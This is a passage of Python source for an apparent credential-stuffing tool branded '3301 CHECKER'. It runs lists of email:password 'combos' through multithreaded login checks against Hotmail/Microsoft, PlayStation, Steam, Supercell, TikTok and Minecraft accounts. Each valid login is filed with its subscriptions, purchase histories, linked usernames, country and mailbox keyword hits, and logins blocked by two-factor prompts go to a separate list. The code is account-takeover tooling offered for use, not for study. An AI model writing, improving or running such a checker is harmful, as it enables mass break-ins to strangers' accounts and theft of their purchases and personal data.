                with open(free_file, 'a', encoding='utf-8') as f:
                    f.write(line)
        else:
            active_subs = [s for s in subscriptions if not s.get('is_expired', False)]
            for sub in active_subs:
                category = sub.get('category', 'other')
                sub_file = os.path.join(self.microsoft_folder, f"{category}.txt")
                
                line = f"{email}:{password} | {sub.get('name', 'UNKNOWN')}"
                if 'days_remaining' in sub:
                    line += f" | {sub['days_remaining']} days"
                if 'amount' in sub and 'currency' in sub:
                    line += f" | {sub['amount']} {sub['currency']}"
                line += "\n"
                
                with open(sub_file, 'a', encoding='utf-8') as f:
                    f.write(line)
        
        psn_orders = result_data.get("psn_orders", 0)
        if psn_orders > 0:
            psn_file = os.path.join(self.psn_folder, "psn_orders.txt")
            purchases = result_data.get("psn_purchases", [])
            
            line = f"{email}:{password} | Orders: {psn_orders}\n"
            
            if purchases:
                line += "=" * 50 + "\n"
                for i, purchase in enumerate(purchases[:10], 1):
                    item = purchase.get('item', 'Unknown Item')
                    line += f"  [{i}] {item}"
                    
                    if 'price' in purchase:
                        line += f" - {purchase['price']}"
                    if 'date' in purchase:
                        line += f" ({purchase['date']})"
                    if 'order_id' in purchase:
                        line += f" [Order: {purchase['order_id']}]"
                    
                    line += "\n"
                line += "=" * 50 + "\n"
            
            with open(psn_file, 'a', encoding='utf-8') as f:
                f.write(line)
        
        steam_count = result_data.get("steam_count", 0)
        if steam_count > 0:
            steam_file = os.path.join(self.steam_folder, "steam_purchases.txt")
            purchases = result_data.get("steam_purchases", [])
            
            line = f"{email}:{password} | {steam_count} purchases"
            if purchases:
                games = [p.get('game', 'Unknown') for p in purchases[:3]]
                line += f" | Games: {', '.join(games)}"
            line += "\n"
            
            with open(steam_file, 'a', encoding='utf-8') as f:
                f.write(line)
        
        supercell_games = result_data.get("supercell_games", [])
        if supercell_games:
            supercell_file = os.path.join(self.supercell_folder, "supercell_linked.txt")
            line = f"{email}:{password} | Games: {', '.join(supercell_games)}\n"
            with open(supercell_file, 'a', encoding='utf-8') as f:
                f.write(line)
        
        tiktok_username = result_data.get("tiktok_username")
        if tiktok_username:
            tiktok_file = os.path.join(self.tiktok_folder, "tiktok_linked.txt")
            with open(tiktok_file, 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password} | @{tiktok_username}\n")
        
        minecraft_username = result_data.get("minecraft_username")
        if minecraft_username:
            minecraft_file = os.path.join(self.minecraft_folder, "minecraft_accounts.txt")
            line = f"{email}:{password} | Username: {minecraft_username}"
            
            uuid = result_data.get("minecraft_uuid", "")
            if uuid:
                line += f" | UUID: {uuid}"
            
            capes = result_data.get("minecraft_capes", [])
            if capes:
                line += f" | Capes: {', '.join(capes)}"
            
            line += "\n"
            with open(minecraft_file, 'a', encoding='utf-8') as f:
                f.write(line)
        
        keywords = result_data.get("keywords", {})
        for kw, info in keywords.items():
            kw_file = os.path.join(self.keywords_folder, f"{kw}.txt")
            with open(kw_file, 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password} | {info['count']}\n")
        
        country = result_data.get("country", "").strip().upper()
        if country and len(country) >= 2:
            country_file = os.path.join(self.countries_folder, f"{country[:2].lower()}.txt")
            try:
                with open(country_file, 'a', encoding='utf-8') as f:
                    f.write(f"{email}:{password}\n")
            except:
                pass
    
    def save_2fa(self, email, password):
        try:
            with open(self.two_fa_file, 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password}\n")
        except:
            pass


class LiveStats:
    def __init__(self, total):
        self.total = total
        self.checked = 0
        self.hits = 0
        self.two_fa = 0
        self.bads = 0
        self.ms_premium = 0
        self.ms_free = 0
        self.psn_hits = 0
        self.steam_hits = 0
        self.supercell_hits = 0
        self.tiktok_hits = 0
        self.minecraft_hits = 0
        self.start_time = time.time()
        self.lock = Lock()
        self.last_length = 0
        
    def update(self, status, result_data=None):
        with self.lock:
            self.checked += 1
            if status == "HIT":
                self.hits += 1
                if result_data:
                    subs = result_data.get("subscriptions", [])
                    ms_data = result_data.get("ms_data", {})
                    active_subs = [s for s in subs if not s.get('is_expired', False)]
                    
                    if active_subs:
                        self.ms_premium += 1
                    elif ms_data or result_data.get("ms_status") == "FREE":
                        self.ms_free += 1
                    
                    if result_data.get("psn_orders", 0) > 0:
                        self.psn_hits += 1
                    
                    if result_data.get("steam_count", 0) > 0:
                        self.steam_hits += 1
                    
                    if result_data.get("supercell_games"):
                        self.supercell_hits += 1
                    
                    if result_data.get("tiktok_username"):
                        self.tiktok_hits += 1
                    
                    if result_data.get("minecraft_username"):
                        self.minecraft_hits += 1
            elif status == "2FA":
                self.two_fa += 1
            else:
                self.bads += 1
    
    def print_live(self, check_mode):
        with self.lock:
            elapsed = time.time() - self.start_time
            cpm = (self.checked / elapsed * 60) if elapsed > 0 else 0
            progress = (self.checked / self.total * 100) if self.total > 0 else 0
            time_str = time.strftime("%M:%S", time.gmtime(elapsed))
            
            if self.last_length > 0:
                sys.stdout.write('\r' + ' ' * self.last_length + '\r')
            
            parts = []
            parts.append(f"{Colors.BRIGHT_BLUE}[{self.checked}/{self.total}]{Colors.END}")
            
            if self.hits > 0:
                parts.append(f"{Colors.BRIGHT_GREEN}✓{self.hits}{Colors.END}")
            
            if check_mode in ["microsoft", "both"]:
                if self.ms_premium > 0:
                    parts.append(f"{Colors.BRIGHT_MAGENTA}🎮{self.ms_premium}{Colors.END}")
                if self.ms_free > 0:
                    parts.append(f"{Colors.CYAN}⭕{self.ms_free}{Colors.END}")
            
            if check_mode in ["psn", "both"] and self.psn_hits > 0:
                parts.append(f"{Colors.BRIGHT_BLUE}🎯{self.psn_hits}{Colors.END}")
            
            if check_mode in ["steam", "both"] and self.steam_hits > 0:
                parts.append(f"{Colors.BRIGHT_CYAN}🎲{self.steam_hits}{Colors.END}")
            
            if check_mode in ["supercell", "both"] and self.supercell_hits > 0:
                parts.append(f"{Colors.BRIGHT_YELLOW}⚔️{self.supercell_hits}{Colors.END}")
            
            if check_mode in ["tiktok", "both"] and self.tiktok_hits > 0:
                parts.append(f"{Colors.MAGENTA}📱{self.tiktok_hits}{Colors.END}")
            
            if check_mode in ["minecraft", "both"] and self.minecraft_hits > 0:
                parts.append(f"{Colors.GREEN}⛏️{self.minecraft_hits}{Colors.END}")
            
            if self.two_fa > 0:
                parts.append(f"{Colors.YELLOW}🔐{self.two_fa}{Colors.END}")
            
            if self.bads > 0:
                parts.append(f"{Colors.RED}✗{self.bads}{Colors.END}")
            
            parts.append(f"{Colors.DIM}|{Colors.END}")
            parts.append(f"{Colors.WHITE}{progress:.0f}%{Colors.END}")
            parts.append(f"{Colors.DIM}|{Colors.END}")
            parts.append(f"{Colors.BRIGHT_YELLOW}{cpm:.0f}CPM{Colors.END}")
            parts.append(f"{Colors.DIM}|{Colors.END}")
            parts.append(f"{Colors.BRIGHT_CYAN}{time_str}{Colors.END}")
            
            line = " ".join(parts)
            
            self.last_length = len(line) - line.count('\033')
            sys.stdout.write(line)
            sys.stdout.flush()


def clear():
    os.system('cls' if os.name == 'nt' else 'clear')


def print_banner():
    banner = f"""
{Colors.BRIGHT_CYAN}╔════════════════════════════════════════════════
║ {Colors.BRIGHT_MAGENTA}  /$$$$$$   /$$$$$$   /$$$$$$    /$$   {Colors.BRIGHT_CYAN}        
║ {Colors.BRIGHT_MAGENTA} /$$__  $$ /$$__  $$ /$$$_  $$ /$$$$   {Colors.BRIGHT_CYAN}        
║ {Colors.BRIGHT_MAGENTA}|__/  \ $$|__/  \ $$| $$$$\ $$|_  $$   {Colors.BRIGHT_CYAN}   
║ {Colors.BRIGHT_MAGENTA}  /$$$$$/   /$$$$$/| $$ $$ $$  | $$    {Colors.BRIGHT_CYAN}   
║ {Colors.BRIGHT_MAGENTA}  |___  $$  |___  $$| $$\ $$$$  | $$   {Colors.BRIGHT_CYAN}   
║ {Colors.BRIGHT_MAGENTA}/$$  \ $$ /$$  \ $$| $$ \ $$$  | $$    {Colors.BRIGHT_CYAN}   
║ {Colors.BRIGHT_MAGENTA}|  $$$$$$/|  $$$$$$/|  $$$$$$/ /$$$$$$ {Colors.BRIGHT_CYAN}   
║ {Colors.BRIGHT_MAGENTA}\______/  \______/  \______/ |______/  {Colors.BRIGHT_CYAN}   
║                                                                                      
║  {Colors.BRIGHT_YELLOW}3301 CHECKER -                                                
║  {Colors.BRIGHT_GREEN}HOTMAIL | MS365 | XBOX | PSN | STEAM | TIKTOK | SUPERCELL{Colors.BRIGHT_CYAN}
║  {Colors.BRIGHT_MAGENTA}OPTIMIZED • ENHANCED • HIGH PERFORMANCE{Colors.BRIGHT_CYAN}  
╚═══════════════════════════════════════════════════════════════{Colors.END}
"""
    print(banner)


def print_menu_header(title):
    print(f"\n{Colors.BRIGHT_CYAN}╔{'═' * 68}╗{Colors.END}")
    print(f"{Colors.BRIGHT_CYAN}║{Colors.BOLD}{Colors.BRIGHT_YELLOW} {title:^66} {Colors.BRIGHT_CYAN}║{Colors.END}")
    print(f"{Colors.BRIGHT_CYAN}╚{'═' * 68}╝{Colors.END}\n")


def print_option(number, title, desc, color=Colors.WHITE):
    print(f"{Colors.BRIGHT_CYAN}  [{Colors.BRIGHT_YELLOW}{number}{Colors.BRIGHT_CYAN}]{Colors.END} {color}{title}{Colors.END}")
    print(f"      {Colors.DIM}{desc}{Colors.END}")


if __name__ == "__main__":
    
    clear()
    print_banner()
    
    print_menu_header("🎯 SERVICE SELECTION")
    print_option("1", "Hotmail Only", "Keywords + Inbox", Colors.BRIGHT_GREEN)
    print_option("2", "Microsoft Subs", "Xbox + M365 + Office", Colors.BRIGHT_MAGENTA)
    print_option("3", "PlayStation", "PSN Orders & Games", Colors.BRIGHT_BLUE)
    print_option("4", "Steam", "Purchase History", Colors.BRIGHT_CYAN)
    print_option("5", "Supercell", "Clash/Brawl/Hay Day", Colors.BRIGHT_YELLOW)
    print_option("6", "TikTok", "Linked Accounts", Colors.MAGENTA)
    print_option("7", "Minecraft", "MC Accounts & Capes", Colors.GREEN)
    print_option("8", "Full Scan", "Everything (Recommended)", Colors.BRIGHT_BLUE)
    
    check_choice = input(f"\n{Colors.BRIGHT_CYAN}└─{Colors.END} Select mode: ").strip()
    
    check_mode_map = {
        "1": "hotmail",
        "2": "microsoft",
        "3": "psn",
        "4": "steam",
        "5": "supercell",
        "6": "tiktok",
        "7": "minecraft",
        "8": "both"
    }
    check_mode = check_mode_map.get(check_choice, "both")
    
    api_mode = 2
    if check_mode in ["hotmail", "both"]:
        print_menu_header("⚙️ API MODE")
        print_option("1", "Full API", "All features (Slow)", Colors.YELLOW)
        print_option("2", "Fast API", "Recommended (Balanced)", Colors.BRIGHT_GREEN)
        print_option("3", "Minimal API", "Quick validation (Fast)", Colors.CYAN)
        
        api_choice = input(f"\n{Colors.BRIGHT_CYAN}└─{Colors.END} Select mode: ").strip()
        api_mode = int(api_choice) if api_choice in ["1", "2", "3"] else 2
    
    print_menu_header("🚀 THREADING")
    print_option("1", "Single Check", "Test one account", Colors.CYAN)
    print_option("2", "Serial Mode", "One by one (Safe)", Colors.YELLOW)
    print_option("3", "Multi-Threaded", "Parallel processing (Fast)", Colors.BRIGHT_GREEN)
    
    thread_choice = input(f"\n{Colors.BRIGHT_CYAN}└─{Colors.END} Select mode: ").strip()
    
    if thread_choice not in ["1", "2", "3"]:
        print(f"{Colors.RED}✗ Invalid choice!{Colors.END}")
        exit()
    
    threads = 1
    if thread_choice == "3":
        threads_input = input(f"{Colors.BRIGHT_CYAN}└─{Colors.END} Threads (1-100): ").strip()
        try:
            threads = int(threads_input)
            threads = max(1, min(100, threads))
        except:
            threads = 10
            print(f"{Colors.YELLOW}⚠ Using default: 10 threads{Colors.END}")
    
    keywords = []
    if check_mode in ["hotmail", "both"]:
        print_menu_header("🔑 KEYWORDS")
        print_option("1", "Manual Input", "Type keywords manually", Colors.CYAN)
        print_option("2", "Load from File", "Import from .txt file", Colors.YELLOW)
        print_option("3", "Skip", "No keyword searching", Colors.RED)
        
        kw_choice = input(f"\n{Colors.BRIGHT_CYAN}└─{Colors.END} Select: ").strip()
        
        if kw_choice == "1":
            print(f"\n{Colors.BRIGHT_YELLOW}Enter keywords (empty line to finish):{Colors.END}")
            while True:
                kw = input(f"  {Colors.BRIGHT_CYAN}→{Colors.END} ").strip()
                if not kw:
                    break
                keywords.append(kw)
                print(f"    {Colors.GREEN}✓ Added: {kw}{Colors.END}")
        
        elif kw_choice == "2":
            kw_file = input(f"{Colors.BRIGHT_CYAN}└─{Colors.END} File path: ").strip()
            try:
                with open(kw_file, 'r', encoding='utf-8') as f:
                    keywords = [l.strip() for l in f.readlines() if l.strip()]
                print(f"{Colors.GREEN}✓ Loaded {len(keywords)} keywords{Colors.END}")
            except:
                print(f"{Colors.RED}✗ File not found{Colors.END}")
    
    debug_choice = input(f"\n{Colors.BRIGHT_CYAN}└─{Colors.END} Debug mode? [y/n]: ").strip().lower()
    debug_mode = debug_choice == 'y'
    
    checker = UnifiedChecker(keywords=keywords, debug=debug_mode, api_mode=api_mode, check_mode=check_mode)
    
    if thread_choice == "1":
        clear()
        print_banner()
        print(f"\n{Colors.BRIGHT_CYAN}{'═' * 70}{Colors.END}")
        email = input(f"{Colors.BRIGHT_GREEN}Email:{Colors.END} ").strip()
        password = input(f"{Colors.BRIGHT_GREEN}Password:{Colors.END} ").strip()
        
        print(f"\n{Colors.BRIGHT_YELLOW}⟳ Checking...{Colors.END}")
        result = checker.check(email, password)
        
        print(f"\n{Colors.BRIGHT_CYAN}{'═' * 70}{Colors.END}\n")
        
        if result["status"] == "HIT":
            print(f"{Colors.BRIGHT_GREEN}✓ SUCCESS{Colors.END}")
            print(f"  {Colors.CYAN}Email:{Colors.END} {email}")
            
            if result.get("name"):
                print(f"  {Colors.CYAN}Name:{Colors.END} {result['name']}")
            if result.get("country"):
                print(f"  {Colors.CYAN}Country:{Colors.END} {result['country']}")
            
            subscriptions = result.get("subscriptions", [])
            active_subs = [s for s in subscriptions if not s.get('is_expired', False)]
            if active_subs:
                print(f"\n  {Colors.BRIGHT_MAGENTA}🎮 MICROSOFT SUBSCRIPTIONS{Colors.END}")
                for sub in active_subs:
                    print(f"    {Colors.BRIGHT_YELLOW}•{Colors.END} {Colors.WHITE}{sub.get('name', 'UNKNOWN')}{Colors.END}")
                    if 'days_remaining' in sub:
                        days = sub['days_remaining']
                        color = Colors.BRIGHT_GREEN
                        print(f"      {color}└─ {days} days remaining{Colors.END}")
            
            psn_orders = result.get("psn_orders", 0)
            if psn_orders > 0:
                print(f"\n  {Colors.BRIGHT_BLUE}🎯 PLAYSTATION NETWORK{Colors.END}")
                print(f"    {Colors.WHITE}Orders:{Colors.END} {Colors.BRIGHT_GREEN}{psn_orders}{Colors.END}")
                purchases = result.get("psn_purchases", [])
                if purchases:
                    print(f"    {Colors.CYAN}Recent Purchases:{Colors.END}")
                    for purchase in purchases[:5]:
                        item = purchase.get('item', 'Unknown')
                        print(f"      {Colors.YELLOW}•{Colors.END} {Colors.WHITE}{item}{Colors.END}", end='')
                        if 'price' in purchase:
                            print(f" {Colors.GREEN}({purchase['price']}){Colors.END}", end='')
                        if 'date' in purchase:
                            print(f" {Colors.DIM}[{purchase['date']}]{Colors.END}", end='')
                        print()
            
            steam_count = result.get("steam_count", 0)
            if steam_count > 0:
                print(f"\n  {Colors.BRIGHT_CYAN}🎲 STEAM{Colors.END}")
                print(f"    {Colors.WHITE}Purchases:{Colors.END} {Colors.BRIGHT_GREEN}{steam_count}{Colors.END}")
                purchases = result.get("steam_purchases", [])
                if purchases:
                    print(f"    {Colors.CYAN}Recent Games:{Colors.END}")
                    for purchase in purchases[:5]:
                        game = purchase.get('game', 'Unknown')
                        print(f"      {Colors.YELLOW}•{Colors.END} {Colors.WHITE}{game}{Colors.END}")
            
            supercell_games = result.get("supercell_games", [])
            if supercell_games:
                print(f"\n  {Colors.BRIGHT_YELLOW}⚔️ SUPERCELL GAMES{Colors.END}")
                for game in supercell_games:
                    print(f"    {Colors.YELLOW}•{Colors.END} {Colors.WHITE}{game}{Colors.END}")
            
            tiktok_username = result.get("tiktok_username")
            if tiktok_username:
                print(f"\n  {Colors.MAGENTA}📱 TIKTOK{Colors.END}")
                print(f"    {Colors.WHITE}Username:{Colors.END} {Colors.BRIGHT_MAGENTA}@{tiktok_username}{Colors.END}")
            
            minecraft_username = result.get("minecraft_username")
            if minecraft_username:
                print(f"\n  {Colors.GREEN}⛏️ MINECRAFT{Colors.END}")
                print(f"    {Colors.WHITE}Username:{Colors.END} {Colors.BRIGHT_GREEN}{minecraft_username}{Colors.END}")
                uuid = result.get("minecraft_uuid")
                if uuid:
                    print(f"    {Colors.WHITE}UUID:{Colors.END} {Colors.CYAN}{uuid}{Colors.END}")
                capes = result.get("minecraft_capes", [])
                if capes:
                    print(f"    {Colors.WHITE}Capes:{Colors.END} {Colors.YELLOW}{', '.join(capes)}{Colors.END}")
            
            keywords_found = result.get("keywords", {})
            if keywords_found:
                print(f"\n  {Colors.BRIGHT_YELLOW}🔑 KEYWORDS{Colors.END}")
                for kw, info in keywords_found.items():
                    print(f"    {Colors.BRIGHT_YELLOW}•{Colors.END} {Colors.WHITE}{kw}:{Colors.END} {Colors.GREEN}{info['count']}{Colors.END}")
        
        elif result["status"] == "2FA":
            print(f"{Colors.BRIGHT_YELLOW}🔐 2FA REQUIRED{Colors.END}")
            print(f"  {Colors.CYAN}Email:{Colors.END} {email}")
            print(f"  {Colors.GREEN}✓ Valid credentials{Colors.END}")
        
        else:
            print(f"{Colors.RED}✗ {result['status']}{Colors.END}")
        
        print(f"\n{Colors.BRIGHT_CYAN}{'═' * 70}{Colors.END}")
    
    else:
        combo_file = input(f"\n{Colors.BRIGHT_CYAN}└─{Colors.END} Combo file: ").strip()
        
        try:
            with open(combo_file, 'r', encoding='utf-8') as f:
                lines = [l.strip() for l in f.readlines() if l.strip() and ':' in l]
            
            if not lines:
                print(f"{Colors.RED}✗ Empty file!{Colors.END}")
                exit()
            
            combo_name = os.path.basename(combo_file).replace('.txt', '')
            mode_name = f"{check_mode}_api{api_mode}"
            result_mgr = ResultManager(combo_name, mode_name)
            
            clear()
            print_banner()
            
            print(f"\n{Colors.BRIGHT_CYAN}╔{'═' * 68}╗{Colors.END}")
            print(f"{Colors.BRIGHT_CYAN}║{Colors.BOLD}{Colors.BRIGHT_GREEN} {'CONFIGURATION':^66} {Colors.BRIGHT_CYAN}║{Colors.END}")
            print(f"{Colors.BRIGHT_CYAN}╠{'═' * 68}╣{Colors.END}")
            print(f"{Colors.BRIGHT_CYAN}║{Colors.END} {Colors.WHITE}Accounts:{Colors.END}  {Colors.BRIGHT_YELLOW}{len(lines):>56}{Colors.END} {Colors.BRIGHT_CYAN}║{Colors.END}")
            print(f"{Colors.BRIGHT_CYAN}║{Colors.END} {Colors.WHITE}Mode:{Colors.END}      {Colors.BRIGHT_MAGENTA}{check_mode.upper():>56}{Colors.END} {Colors.BRIGHT_CYAN}║{Colors.END}")
            print(f"{Colors.BRIGHT_CYAN}║{Colors.END} {Colors.WHITE}Threads:{Colors.END}   {Colors.BRIGHT_CYAN}{threads if thread_choice == '3' else 'Serial':>56}{Colors.END} {Colors.BRIGHT_CYAN}║{Colors.END}")
            print(f"{Colors.BRIGHT_CYAN}║{Colors.END} {Colors.WHITE}Keywords:{Colors.END}  {Colors.BRIGHT_YELLOW}{len(keywords):>56}{Colors.END} {Colors.BRIGHT_CYAN}║{Colors.END}")
            print(f"{Colors.BRIGHT_CYAN}╚{'═' * 68}╝{Colors.END}\n")
            
            print(f"{Colors.BRIGHT_GREEN}Starting scan...{Colors.END}\n")
            
            stats = LiveStats(len(lines))
            
            def process(line_data):
                line, idx = line_data
                try:
                    parts = line.split(':', 1)
                    if len(parts) != 2:
                        stats.update("BAD")
                        stats.print_live(check_mode)
                        return
                    
                    email = parts[0].strip()
                    password = parts[1].strip()
                    
                    thread_checker = UnifiedChecker(keywords=keywords, debug=False, api_mode=api_mode, check_mode=check_mode)
                    result = thread_checker.check(email, password)
                    
                    stats.update(result["status"], result if result["status"] == "HIT" else None)
                    
                    if result["status"] == "HIT":
                        hit_parts = [f"\n{Colors.BRIGHT_GREEN}✓{Colors.END}", f"{Colors.WHITE}{email[:35]}{Colors.END}"]
                        
                        subs = result.get("subscriptions", [])
                        active_subs = [s for s in subs if not s.get('is_expired', False)]
                        if active_subs:
                            for sub in active_subs[:2]:
                                name = sub.get('name', 'SUB')
                                days = sub.get('days_remaining', '?')
                                hit_parts.append(f"{Colors.BRIGHT_MAGENTA}🎮{name}({days}d){Colors.END}")
                        
                        psn_orders = result.get("psn_orders", 0)
                        if psn_orders > 0:
                            purchases = result.get("psn_purchases", [])
                            if purchases and purchases[0].get('item'):
                                item = purchases[0]['item'][:20]
                                hit_parts.append(f"{Colors.BRIGHT_BLUE}🎯PSN:{psn_orders}({item}){Colors.END}")
                            else:
                                hit_parts.append(f"{Colors.BRIGHT_BLUE}🎯PSN:{psn_orders}{Colors.END}")
                        
                        steam_count = result.get("steam_count", 0)
                        if steam_count > 0:
                            purchases = result.get("steam_purchases", [])
                            if purchases and purchases[0].get('game'):
                                game = purchases[0]['game'][:20]
                                hit_parts.append(f"{Colors.BRIGHT_CYAN}🎲Steam:{steam_count}({game}){Colors.END}")
                            else:
                                hit_parts.append(f"{Colors.BRIGHT_CYAN}🎲Steam:{steam_count}{Colors.END}")
                        
                        supercell_games = result.get("supercell_games", [])
                        if supercell_games:
                            games_str = ','.join([g[:3] for g in supercell_games[:2]])
                            hit_parts.append(f"{Colors.BRIGHT_YELLOW}⚔️{games_str}{Colors.END}")
                        
                        tiktok_username = result.get("tiktok_username")
                        if tiktok_username:
                            hit_parts.append(f"{Colors.MAGENTA}📱@{tiktok_username[:15]}{Colors.END}")
                        
                        minecraft_username = result.get("minecraft_username")
                        if minecraft_username:
                            hit_parts.append(f"{Colors.GREEN}⛏️{minecraft_username[:15]}{Colors.END}")
                        
                        print(" ".join(hit_parts))
                        result_mgr.save_hit(email, password, result)
                    
                    elif result["status"] == "2FA":
                        print(f"\n{Colors.YELLOW}🔐{Colors.END} {Colors.WHITE}{email[:40]}{Colors.END}")
                        result_mgr.save_2fa(email, password)
                    
                    stats.print_live(check_mode)
                    time.sleep(0.2)
                    
                except Exception as e:
                    stats.update("BAD")
                    stats.print_live(check_mode)
            
            if thread_choice == "2":
                for i, line in enumerate(lines, 1):
                    process((line, i))
            else:
                with ThreadPoolExecutor(max_workers=threads) as executor:
                    executor.map(process, [(l, i) for i, l in enumerate(lines, 1)])
            
            with stats.lock:
                elapsed = time.time() - stats.start_time
                cpm = (stats.checked / elapsed * 60) if elapsed > 0 else 0
                time_str = time.strftime("%H:%M:%S", time.gmtime(elapsed))
            
            print(f"\n\n{Colors.BRIGHT_CYAN}╔{'═' * 68}╗{Colors.END}")
            print(f"{Colors.BRIGHT_CYAN}║{Colors.BOLD}{Colors.BRIGHT_YELLOW} {'📊 FINAL RESULTS':^66} {Colors.BRIGHT_CYAN}║{Colors.END}")
            print(f"{Colors.BRIGHT_CYAN}╠{'═' * 68}╣{Colors.END}")
            print(f"{Colors.BRIGHT_CYAN}║{Colors.END} {Colors.BRIGHT_GREEN}✓ Hits:{Colors.END}            {Colors.BRIGHT_GREEN}{stats.hits:>48}{Colors.END} {Colors.BRIGHT_CYAN}║{Colors.END}")
            print(f"{Colors.BRIGHT_CYAN}║{Colors.END} {Colors.YELLOW}🔐 2FA:{Colors.END}             {Colors.YELLOW}{stats.two_fa:>48}{Colors.END} {Colors.BRIGHT_CYAN}║{Colors.END}")
            
            if check_mode in ["microsoft", "both"] and stats.ms_premium > 0:
                print(f"{Colors.BRIGHT_CYAN}║{Colors.END} {Colors.BRIGHT_MAGENTA}🎮 MS Premium:{Colors.END}      {Colors.BRIGHT_MAGENTA}{stats.ms_premium:>48}{Colors.END} {Colors.BRIGHT_CYAN}║{Colors.END}")
            
            if check_mode in ["psn", "both"] and stats.psn_hits > 0:
                print(f"{Colors.BRIGHT_CYAN}║{Colors.END} {Colors.BRIGHT_BLUE}🎯 PSN Hits:{Colors.END}        {Colors.BRIGHT_BLUE}{stats.psn_hits:>48}{Colors.END} {Colors.BRIGHT_CYAN}║{Colors.END}")
            
            if check_mode in ["steam", "both"] and stats.steam_hits > 0:
                print(f"{Colors.BRIGHT_CYAN}║{Colors.END} {Colors.BRIGHT_CYAN}🎲 Steam Hits:{Colors.END}      {Colors.BRIGHT_CYAN}{stats.steam_hits:>48}{Colors.END} {Colors.BRIGHT_CYAN}║{Colors.END}")
            
            if check_mode in ["supercell", "both"] and stats.supercell_hits > 0:
                print(f"{Colors.BRIGHT_CYAN}║{Colors.END} {Colors.BRIGHT_YELLOW}⚔️ Supercell:{Colors.END}       {Colors.BRIGHT_YELLOW}{stats.supercell_hits:>48}{Colors.END} {Colors.BRIGHT_CYAN}║{Colors.END}")
            
            if check_mode in ["tiktok", "both"] and stats.tiktok_hits > 0:
                print(f"{Colors.BRIGHT_CYAN}║{Colors.END} {Colors.MAGENTA}📱 TikTok:{Colors.END}          {Colors.MAGENTA}{stats.tiktok_hits:>48}{Colors.END} {Colors.BRIGHT_CYAN}║{Colors.END}")
            
            if check_mode in ["minecraft", "both"] and stats.minecraft_hits > 0:
                print(f"{Colors.BRIGHT_CYAN}║{Colors.END} {Colors.GREEN}⛏️ Minecraft:{Colors.END}       {Colors.GREEN}{stats.minecraft_hits:>48}{Colors.END} {Colors.BRIGHT_CYAN}║{Colors.END}")
            
            print(f"{Colors.BRIGHT_CYAN}║{Colors.END} {Colors.RED}✗ Bad:{Colors.END}             {Colors.RED}{stats.bads:>48}{Colors.END} {Colors.BRIGHT_CYAN}║{Colors.END}")
            print(f"{Colors.BRIGHT_CYAN}╠{'═' * 68}╣{Colors.END}")
            print(f"{Colors.BRIGHT_CYAN}║{Colors.END} {Colors.WHITE}Total:{Colors.END}            {Colors.WHITE}{stats.checked}/{stats.total:>48}{Colors.END} {Colors.BRIGHT_CYAN}║{Colors.END}")
            print(f"{Colors.BRIGHT_CYAN}║{Colors.END} {Colors.BRIGHT_YELLOW}CPM:{Colors.END}               {Colors.BRIGHT_YELLOW}{cpm:.0f:>48}{Colors.END} {Colors.BRIGHT_CYAN}║{Colors.END}")
            print(f"{Colors.BRIGHT_CYAN}║{Colors.END} {Colors.BRIGHT_CYAN}Time:{Colors.END}              {Colors.BRIGHT_CYAN}{time_str:>48}{Colors.END} {Colors.BRIGHT_CYAN}║{Colors.END}")
            print(f"{Colors.BRIGHT_CYAN}╚{'═' * 68}╝{Colors.END}")
            
            if stats.hits > 0:
                print(f"\n{Colors.BRIGHT_GREEN}✓ Results saved:{Colors.END} {Colors.CYAN}{result_mgr.base_folder}{Colors.END}")
            
        except FileNotFoundError:
            print(f"{Colors.RED}✗ File not found!{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}✗ Error: {str(e)}{Colors.END}")
    
    print(f"\n{Colors.BRIGHT_CYAN}{'═' * 70}{Colors.END}")
    print(f"{Colors.BRIGHT_GREEN}✨ COMPLETED{Colors.END}")
    print(f"{Colors.BRIGHT_MAGENTA}🌐 Visit: @ar4s/{Colors.END}")
    print(f"{Colors.BRIGHT_CYAN}{'═' * 70}{Colors.END}\n")